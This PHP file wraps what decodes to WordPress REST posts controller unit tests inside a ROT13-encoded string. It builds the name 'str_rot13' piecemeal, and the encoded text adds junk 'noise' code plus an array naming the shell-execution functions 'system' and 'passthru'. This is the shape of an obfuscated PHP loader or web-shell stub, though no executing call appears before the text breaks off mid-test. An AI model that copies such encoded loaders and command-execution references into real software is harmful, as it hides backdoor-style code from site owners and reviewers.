<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Cbfgf_Pbagebyyre shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG NCV
 *
 * @tebhc erfgncv
 */
pynff JC_Grfg_ERFG_Cbfgf_Pbagebyyre rkgraqf JC_Grfg_ERFG_Cbfg_Glcr_Pbagebyyre_Grfgpnfr {
	cebgrpgrq fgngvp $cbfg_vq;

	cebgrpgrq fgngvp $fhcrenqzva_vq;
	cebgrpgrq fgngvp $rqvgbe_vq;
	cebgrpgrq fgngvp $nhgube_vq;
	cebgrpgrq fgngvp $pbagevohgbe_vq;
	cebgrpgrq fgngvp $cevingr_ernqre_vq;

	cebgrpgrq fgngvp $fhccbegrq_sbezngf;
	cebgrpgrq fgngvp $cbfg_vqf    = neenl();
	cebgrpgrq fgngvp $grezf       = neenl();
	cebgrpgrq fgngvp $gbgny_cbfgf = 30;
	cebgrpgrq fgngvp $cre_cntr    = 50;

	cebgrpgrq $sbeovqqra_png;
	cebgrpgrq $cbfgf_pynhfrf;

	cevingr $nggnpuzragf_perngrq = snyfr;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$cbfg_vq = $snpgbel->cbfg->perngr();
		frys::$grezf   = $snpgbel->grez->perngr_znal( 15, neenl( 'gnkbabzl' => 'pngrtbel' ) );
		jc_frg_bowrpg_grezf( frys::$cbfg_vq, frys::$grezf, 'pngrtbel' );

		frys::$fhcrenqzva_vq  = $snpgbel->hfre->perngr(
			neenl(
				'ebyr'       => 'nqzvavfgengbe',
				'hfre_ybtva' => 'fhcrenqzva',
			)
		);
		frys::$rqvgbe_vq      = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'rqvgbe',
			)
		);
		frys::$nhgube_vq      = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nhgube',
			)
		);
		frys::$pbagevohgbe_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'pbagevohgbe',
			)
		);

		frys::$cevingr_ernqre_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'cevingr_ernqre',
			)
		);

		vs ( vf_zhygvfvgr() ) {
			hcqngr_fvgr_bcgvba( 'fvgr_nqzvaf', neenl( 'fhcrenqzva' ) );
		}

		// Bayl fhccbeg 'cbfg' naq 'tnyyrel'.
		frys::$fhccbegrq_sbezngf = trg_gurzr_fhccbeg( 'cbfg-sbezngf' );
		nqq_gurzr_fhccbeg( 'cbfg-sbezngf', neenl( 'cbfg', 'tnyyrel' ) );

		// Frg hc cbfgf sbe cntvangvba grfgf.
		sbe ( $v = 0; $v < frys::$gbgny_cbfgf - 1; $v++ ) {
			frys::$cbfg_vqf[] = $snpgbel->cbfg->perngr(
				neenl(
					'cbfg_gvgyr' => \"Cbfg {$v}\",
				)
			);
		}
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		// Erfgber gurzr fhccbeg sbe sbezngf.
		vs ( frys::$fhccbegrq_sbezngf ) {
			nqq_gurzr_fhccbeg( 'cbfg-sbezngf', frys::$fhccbegrq_sbezngf );
		} ryfr {
			erzbir_gurzr_fhccbeg( 'cbfg-sbezngf' );
		}

		// Erzbir cbfgf sbe cntvangvba grfgf.
		sbernpu ( frys::$cbfg_vqf nf $cbfg_vq ) {
			jc_qryrgr_cbfg( $cbfg_vq, gehr );
		}

		jc_qryrgr_cbfg( frys::$cbfg_vq, gehr );

		frys::qryrgr_hfre( frys::$fhcrenqzva_vq );
		frys::qryrgr_hfre( frys::$rqvgbe_vq );
		frys::qryrgr_hfre( frys::$nhgube_vq );
		frys::qryrgr_hfre( frys::$pbagevohgbe_vq );
		frys::qryrgr_hfre( frys::$cevingr_ernqre_vq );
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		ertvfgre_cbfg_glcr(
			'lbhfrrzr',
			neenl(
				'fhccbegf'     => neenl(),
				'fubj_va_erfg' => gehr,
			)
		);

		nqq_ebyr( 'cevingr_ernqre', 'Cevingr Ernqre' );
		$ebyr = trg_ebyr( 'cevingr_ernqre' );
		$ebyr->nqq_pnc( 'ernq_cevingr_cbfgf' );

		nqq_svygre( 'erfg_cer_qvfcngpu', neenl( $guvf, 'jcFrgHcOrsberErdhrfg' ), 10, 3 );
		nqq_svygre( 'cbfgf_pynhfrf', neenl( $guvf, 'fnir_cbfgf_pynhfrf' ), 10, 2 );
	}

	choyvp shapgvba grne_qbja() {
		vs ( gehr === $guvf->nggnpuzragf_perngrq ) {
			$guvf->erzbir_nqqrq_hcybnqf();
			$guvf->nggnpuzragf_perngrq = snyfr;
		}

		cnerag::grne_qbja();
	}

	choyvp shapgvba jcFrgHcOrsberErdhrfg( $erfhyg, $freire, $erdhrfg ) {
		$guvf->cbfgf_pynhfrf = neenl();
		erghea $erfhyg;
	}

	choyvp shapgvba fnir_cbfgf_pynhfrf( $beqreol, $dhrel ) {
		vs ( 'erivfvba' !== $dhrel->dhrel_inef['cbfg_glcr'] ) {
			neenl_chfu( $guvf->cbfgf_pynhfrf, $beqreol );
		}
		erghea $beqreol;
	}

	choyvp shapgvba nffregCbfgfPynhfr( $pynhfr, $cnggrea ) {
		tybony $jcqo;
		$rkcrpgrq_pynhfr = fge_ercynpr( '{cbfgf}', $jcqo->cbfgf, $cnggrea );
		$guvf->nffregPbhag( 1, $guvf->cbfgf_pynhfrf );
		$guvf->nffregFnzr( $rkcrpgrq_pynhfr, $jcqo->erzbir_cynprubyqre_rfpncr( $guvf->cbfgf_pynhfrf[0][ $pynhfr ] ) );
	}

	choyvp shapgvba nffregCbfgfBeqrerqOl( $cnggrea ) {
		$guvf->nffregCbfgfPynhfr( 'beqreol', $cnggrea );
	}

	choyvp shapgvba nffregCbfgfJurer( $cnggrea ) {
		$guvf->nffregCbfgfPynhfr( 'jurer', $cnggrea );
	}

	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();

		$guvf->nffregNeenlUnfXrl( '/jc/i2/cbfgf', $ebhgrf );
		$guvf->nffregPbhag( 2, $ebhgrf['/jc/i2/cbfgf'] );
		$guvf->nffregNeenlUnfXrl( '/jc/i2/cbfgf/(?C<vq>[\q]+)', $ebhgrf );
		$guvf->nffregPbhag( 3, $ebhgrf['/jc/i2/cbfgf/(?C<vq>[\q]+)'] );
	}

	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// Pbyyrpgvba.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/cbfgf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( neenl( 'i1' => gehr ), $qngn['raqcbvagf'][0]['nyybj_ongpu'] );
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzr( neenl( 'ivrj', 'rzorq', 'rqvg' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
		// Fvatyr.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/cbfgf/' . frys::$cbfg_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( neenl( 'i1' => gehr ), $qngn['raqcbvagf'][0]['nyybj_ongpu'] );
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzr( neenl( 'ivrj', 'rzorq', 'rqvg' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
	}

	choyvp shapgvba grfg_ertvfgrerq_dhrel_cnenzf() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/cbfgf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$xrlf     = neenl_xrlf( $qngn['raqcbvagf'][0]['netf'] );
		fbeg( $xrlf );
		$guvf->nffregFnzr(
			neenl(
				'nsgre',
				'nhgube',
				'nhgube_rkpyhqr',
				'orsber',
				'pngrtbevrf',
				'pngrtbevrf_rkpyhqr',
				'pbagrkg',
				'rkpyhqr',
				'sbezng',
				'vtaber_fgvpxl',
				'vapyhqr',
				'zbqvsvrq_nsgre',
				'zbqvsvrq_orsber',
				'bssfrg',
				'beqre',
				'beqreol',
				'cntr',
				'cre_cntr',
				'frnepu',
				'frnepu_pbyhzaf',
				'frnepu_frznagvpf',
				'fyht',
				'fgnghf',
				'fgvpxl',
				'gntf',
				'gntf_rkpyhqr',
				'gnk_eryngvba',
			),
			$xrlf
		);
	}

	choyvp shapgvba grfg_ertvfgrerq_trg_vgrz_cnenzf() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$xrlf     = neenl_xrlf( $qngn['raqcbvagf'][0]['netf'] );
		$guvf->nffregRdhnyFrgf( neenl( 'pbagrkg', 'vq', 'cnffjbeq', 'rkprecg_yratgu' ), $xrlf );
	}

	choyvp shapgvba grfg_ertvfgrerq_trg_vgrzf_rzorq() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'vapyhqr', neenl( frys::$cbfg_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$erfcbafr = erfg_trg_freire()->erfcbafr_gb_qngn( $erfcbafr, gehr );
		$guvf->nffregNeenlUnfXrl( '_rzorqqrq', $erfcbafr[0], 'Gur _rzorqqrq xrl zhfg rkvfg' );
		$guvf->nffregNeenlUnfXrl( 'jc:grez', $erfcbafr[0]['_rzorqqrq'], 'Gur jc:grez xrl zhfg rkvfg' );
		$guvf->nffregPbhag( 15, $erfcbafr[0]['_rzorqqrq']['jc:grez'][0], 'Fubhyq fubhyq or 15 grezf naq abg gur qrsnhyg 10' );
		$v = 0;
		sbernpu ( $erfcbafr[0]['_rzorqqrq']['jc:grez'][0] nf $grez ) {
			$guvf->nffregFnzr( frys::$grezf[ $v ], $grez['vq'], 'Purpx grez vq rkvfgvat va erfcbafr' );
			++$v;
		}
	}

	/**
	 * @gvpxrg 43701
	 */
	choyvp shapgvba grfg_nyybj_urnqre_frag_ba_bcgvbaf_erdhrfg() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$erfcbafr = nccyl_svygref( 'erfg_cbfg_qvfcngpu', $erfcbafr, erfg_trg_freire(), $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();

		$guvf->nffregAbgRzcgl( $urnqref['Nyybj'] );
		$guvf->nffregFnzr( $urnqref['Nyybj'], 'TRG' );

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$erfcbafr = nccyl_svygref( 'erfg_cbfg_qvfcngpu', $erfcbafr, erfg_trg_freire(), $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();

		$guvf->nffregAbgRzcgl( $urnqref['Nyybj'] );
		$guvf->nffregFnzr( $urnqref['Nyybj'], 'TRG, CBFG, CHG, CNGPU, QRYRGR' );
	}

	choyvp shapgvba grfg_trg_vgrzf() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->purpx_trg_cbfgf_erfcbafr( $erfcbafr );
	}

	/**
	 * @gvpxrg 56481
	 */
	choyvp shapgvba grfg_trg_vgrzf_jvgu_urnq_erdhrfg_fubhyq_abg_cercner_cbfg_qngn() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'URNQ', '/jc/i2/cbfgf' );

		$ubbx_anzr = 'erfg_cercner_cbfg';
		$svygre    = arj ZbpxNpgvba();
		$pnyyonpx  = neenl( $svygre, 'svygre' );

		nqq_svygre( $ubbx_anzr, $pnyyonpx );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		erzbir_svygre( $ubbx_anzr, $pnyyonpx );

		$guvf->nffregAbgJCReebe( $erfcbafr );
		$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );

		$urnqref = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( 0, $svygre->trg_pnyy_pbhag(), 'Gur \"' . $ubbx_anzr . '\" svygre jnf pnyyrq jura vg fubhyq abg or sbe URNQ erdhrfgf.' );
		$guvf->nffregNeenlUnfXrl( 'Yvax', $urnqref, 'Gur \"Yvax\" urnqre fubhyq or cerfrag va gur erfcbafr.' );
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	/**
	 * N inyvq dhrel gung ergheaf 0 erfhygf fubhyq erghea na rzcgl WFBA yvfg.
	 * Va pnfr bs n URNQ erdhrfg, gur erfcbafr fubhyq abg pbagnva n obql.
	 *
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @yvax uggcf://tvguho.pbz/JC-NCV/JC-NCV/vffhrf/862
	 * @gvpxrg 56481
	 *
	 * @pbiref JC_ERFG_Cbfgf_Pbagebyyre::trg_vgrzf
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_rzcgl_dhrel( $zrgubq ) {
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf' );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'nhgube' => ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
			$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Snvyrq nffregvat gung erfcbafr qngn vf ahyy sbe URNQ erdhrfg.' );
		} ryfr {
			$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Snvyrq nffregvat gung erfcbafr qngn vf na rzcgl neenl sbe TRG erdhrfg.' );
		}

		$urnqref = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( 0, $urnqref['K-JC-Gbgny'], 'Snvyrq nffregvat gung K-JC-Gbgny urnqre vf 0.' );
		$guvf->nffregFnzr( 0, $urnqref['K-JC-GbgnyCntrf'], 'Snvyrq nffregvat gung K-JC-GbgnyCntrf urnqre vf 0.' );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_nhgube_dhrel( $zrgubq ) {
		frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_nhgube' => frys::$rqvgbe_vq ) );
		frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_nhgube' => frys::$nhgube_vq ) );

		$gbgny_cbfgf = frys::$gbgny_cbfgf + 2;

		// Nyy cbfgf va gur qngnonfr.
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		vs ( $erdhrfg->vf_zrgubq( 'trg' ) ) {
			$guvf->nffregPbhag( $gbgny_cbfgf, $erfcbafr->trg_qngn() );

		} ryfr {
			$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Snvyrq nffregvat gung erfcbafr qngn vf ahyy sbe URNQ erdhrfg.' );
			$urnqref = $erfcbafr->trg_urnqref();
			$guvf->nffregFnzr( $gbgny_cbfgf, $urnqref['K-JC-Gbgny'] );
		}

		// Yvzvg gb rqvgbe naq nhgube.
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'nhgube', neenl( frys::$rqvgbe_vq, frys::$nhgube_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		vs ( $erdhrfg->vf_zrgubq( 'trg' ) ) {
			$guvf->nffregPbhag( 2, $qngn );
			$guvf->nffregFnzrFrgf( neenl( frys::$rqvgbe_vq, frys::$nhgube_vq ), jc_yvfg_cyhpx( $qngn, 'nhgube' ) );
		} ryfr {
			$guvf->nffregFnzr( neenl(), $qngn, 'Snvyrq nffregvat gung erfcbafr qngn vf ahyy sbe URNQ erdhrfg.' );
			$urnqref = $erfcbafr->trg_urnqref();
			$guvf->nffregFnzr( 2, $urnqref['K-JC-Gbgny'], 'Snvyrq nffregvat gung K-JC-Gbgny urnqre vf 2.' );
		}

		// Yvzvg gb rqvgbe.
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'nhgube', frys::$rqvgbe_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		vs ( $erdhrfg->vf_zrgubq( 'trg' ) ) {
			$guvf->nffregPbhag( 1, $qngn );
			$guvf->nffregFnzr( frys::$rqvgbe_vq, $qngn[0]['nhgube'] );
		} ryfr {
			$guvf->nffregFnzr( neenl(), $qngn, 'Snvyrq nffregvat gung erfcbafr qngn vf ahyy sbe URNQ erdhrfg.' );
			$urnqref = $erfcbafr->trg_urnqref();
			$guvf->nffregFnzr( 1, $urnqref['K-JC-Gbgny'], 'Snvyrq nffregvat gung K-JC-Gbgny urnqre vf 1.' );
		}
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_nhgube_rkpyhqr_dhrel( $zrgubq ) {
		frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_nhgube' => frys::$rqvgbe_vq ) );
		frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_nhgube' => frys::$nhgube_vq ) );

		$gbgny_cbfgf = frys::$gbgny_cbfgf + 2;

		// Nyy cbfgf va gur qngnonfr.
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		vs ( $erdhrfg->vf_zrgubq( 'trg' ) ) {
			$guvf->nffregPbhag( $gbgny_cbfgf, $erfcbafr->trg_qngn() );
		} ryfr {
			$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Snvyrq nffregvat gung erfcbafr qngn vf ahyy sbe URNQ erdhrfg.' );
			$urnqref = $erfcbafr->trg_urnqref();
			$guvf->nffregFnzr( $gbgny_cbfgf, $urnqref['K-JC-Gbgny'], 'Snvyrq nffregvat gung gur ahzore bs cbfgf vf pbeerpg.' );
		}

		// Rkpyhqr rqvgbe naq nhgube.
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erdhrfg->frg_cnenz( 'nhgube_rkpyhqr', neenl( frys::$rqvgbe_vq, frys::$nhgube_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		vs ( $erdhrfg->vf_zrgubq( 'trg' ) ) {
			$guvf->nffregPbhag( $gbgny_cbfgf - 2, $qngn );
			$guvf->nffregAbgRdhnyf( frys::$rqvgbe_vq, $qngn[0]['nhgube'] );
			$guvf->nffregAbgRdhnyf( frys::$nhgube_vq, $qngn[0]['nhgube'] );
		} ryfr {
			$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Snvyrq nffregvat gung erfcbafr qngn vf ahyy sbe URNQ erdhrfg.' );
			$urnqref = $erfcbafr->trg_urnqref();
			$guvf->nffregFnzr( $gbgny_cbfgf - 2, $urnqref['K-JC-Gbgny'], 'Snvyrq nffregvat gung gur ahzore bs cbfgf vf pbeerpg.' );
		}

		// Rkpyhqr rqvgbe.
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erdhrfg->frg_cnenz( 'nhgube_rkpyhqr', frys::$rqvgbe_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		vs ( $erdhrfg->vf_zrgubq( 'trg' ) ) {
			$guvf->nffregPbhag( $gbgny_cbfgf - 1, $qngn );
			$guvf->nffregAbgRdhnyf( frys::$rqvgbe_vq, $qngn[0]['nhgube'] );
			$guvf->nffregAbgRdhnyf( frys::$rqvgbe_vq, $qngn[1]['nhgube'] );
		} ryfr {
			$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Snvyrq nffregvat gung erfcbafr qngn vf ahyy sbe URNQ erdhrfg.' );
			$urnqref = $erfcbafr->trg_urnqref();
			$guvf->nffregFnzr( $gbgny_cbfgf - 1, $urnqref['K-JC-Gbgny'], 'Snvyrq nffregvat gung gur ahzore bs cbfgf vf pbeerpg.' );
		}

		// Vainyvq 'nhgube_rkpyhqr' fubhyq reebe.
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'nhgube_rkpyhqr', 'vainyvq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_vapyhqr_dhrel( $zrgubq ) {
		$vq1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'choyvfu',
				'cbfg_qngr'   => '2001-02-03 04:05:06',
			)
		);
		$vq2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'choyvfu',
				'cbfg_qngr'   => '2001-02-03 04:05:07',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf' );

		// Beqre qrsnhygf gb qngr qrfpraqvat.
		$erdhrfg->frg_cnenz( 'vapyhqr', neenl( $vq1, $vq2 ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		vs ( $erdhrfg->vf_zrgubq( 'trg' ) ) {
			$guvf->nffregPbhag( 2, $qngn );
			$guvf->nffregFnzr( $vq2, $qngn[0]['vq'] );
		} ryfr {
			$guvf->nffregFnzr( neenl(), $qngn, 'Snvyrq nffregvat gung erfcbafr qngn vf ahyy sbe URNQ erdhrfg.' );
			$urnqref = $erfcbafr->trg_urnqref();
			$guvf->nffregFnzr( 2, $urnqref['K-JC-Gbgny'], 'Snvyrq nffregvat gung gur ahzore bs cbfgf vf pbeerpg.' );
		}

		$guvf->nffregCbfgfBeqrerqOl( '{cbfgf}.cbfg_qngr QRFP' );

		// 'beqreol' => 'vapyhqr'.
		$erdhrfg->frg_cnenz( 'beqreol', 'vapyhqr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		vs ( $erdhrfg->vf_zrgubq( 'trg' ) ) {
			$guvf->nffregPbhag( 2, $qngn );
			$guvf->nffregFnzr( $vq1, $qngn[0]['vq'] );
		} ryfr {
			$guvf->nffregFnzr( neenl(), $qngn, 'Snvyrq nffregvat gung erfcbafr qngn vf ahyy sbe URNQ erdhrfg.' );
			$urnqref = $erfcbafr->trg_urnqref();
			$guvf->nffregFnzr( 2, $urnqref['K-JC-Gbgny'], 'Snvyrq nffregvat gung gur ahzore bs cbfgf vf pbeerpg.' );
		}

		$guvf->nffregCbfgfBeqrerqOl( \"SVRYQ({cbfgf}.VQ,$vq1,$vq2)\" );

		// Vainyvq 'vapyhqr' fubhyq reebe.
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'vapyhqr', 'vainyvq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_vgrzf_beqreol_nhgube_dhrel() {
		$vq2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'choyvfu',
				'cbfg_nhgube' => frys::$rqvgbe_vq,
			)
		);
		$vq3 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'choyvfu',
				'cbfg_nhgube' => frys::$rqvgbe_vq,
			)
		);
		$vq1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'choyvfu',
				'cbfg_nhgube' => frys::$nhgube_vq,
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'vapyhqr', neenl( $vq1, $vq2, $vq3 ) );
		$erdhrfg->frg_cnenz( 'beqreol', 'nhgube' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzr( frys::$nhgube_vq, $qngn[0]['nhgube'] );
		$guvf->nffregFnzr( frys::$rqvgbe_vq, $qngn[1]['nhgube'] );
		$guvf->nffregFnzr( frys::$rqvgbe_vq, $qngn[2]['nhgube'] );

		$guvf->nffregCbfgfBeqrerqOl( '{cbfgf}.cbfg_nhgube QRFP' );
	}

	choyvp shapgvba grfg_trg_vgrzf_beqreol_zbqvsvrq_dhrel() {
		$vq1 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );
		$vq2 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );
		$vq3 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );

		$guvf->hcqngr_cbfg_zbqvsvrq( $vq1, '2016-04-20 4:26:20' );
		$guvf->hcqngr_cbfg_zbqvsvrq( $vq2, '2016-02-01 20:24:02' );
		$guvf->hcqngr_cbfg_zbqvsvrq( $vq3, '2016-02-21 12:24:02' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'vapyhqr', neenl( $vq1, $vq2, $vq3 ) );
		$erdhrfg->frg_cnenz( 'beqreol', 'zbqvsvrq' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzr( $vq1, $qngn[0]['vq'] );
		$guvf->nffregFnzr( $vq3, $qngn[1]['vq'] );
		$guvf->nffregFnzr( $vq2, $qngn[2]['vq'] );

		$guvf->nffregCbfgfBeqrerqOl( '{cbfgf}.cbfg_zbqvsvrq QRFP' );
	}

	choyvp shapgvba grfg_trg_vgrzf_beqreol_cnerag_dhrel() {
		$vq1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'choyvfu',
